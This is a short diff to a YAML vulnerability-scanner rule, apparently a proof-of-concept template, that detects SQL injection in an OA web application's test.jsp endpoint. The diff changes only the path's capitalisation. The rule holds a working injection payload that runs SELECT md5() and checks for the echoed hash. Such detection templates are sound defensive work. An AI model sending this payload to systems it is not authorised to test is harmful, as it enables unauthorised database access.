@@ -3,7 +3,7 @@ set:
   rand: randomInt(200000000, 210000000)
 rules:
   - method: GET
-    path: /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{rand}}))
+    path: /yyoa/Common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{rand}}))
     expression:
       response.status == 200 && response.body.bcontains(bytes(md5(string(rand))))
 detail:
